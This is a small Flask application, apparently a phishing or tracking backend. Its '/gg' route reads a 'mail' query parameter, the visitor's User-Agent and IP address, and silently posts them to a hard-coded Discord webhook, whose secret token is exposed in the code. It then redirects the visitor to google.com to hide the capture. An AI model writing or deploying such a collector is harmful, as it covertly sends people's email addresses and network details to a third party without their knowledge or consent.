from flask import Flask, render_template, request, redirect
from discordwebhook import Discord
from flask_cors import CORS

# Create a Flask application
app = Flask(__name__)

CORS(app)
# Define a route for the root URL '/'
@app.route('/')
def hello_world():
    # Pass data to the template
    message = 'Hello, World!'
    return render_template('index.html', message=message)

@app.route('/gg')
def idk_wtf():
    param = request.args.get('mail')
    useragent = request.headers.get('User-Agent')
    src_ip = request.remote_addr
    discord = Discord(url="https://discord.com/api/webhooks/1217552500605849671/yzRXq3s_o4d424amxpcuqUgvNbQAkFiH-nYqfcFF--jxovQ1hdNtXv6j7BgtUbG7PwOf")
    discord.post(content=f'Mail: {param}\n User-Agent: {useragent}\n IP: {src_ip}')
    return redirect('https://google.com')

# Run the Flask application
if __name__ == '__main__':
    app.run(debug=True)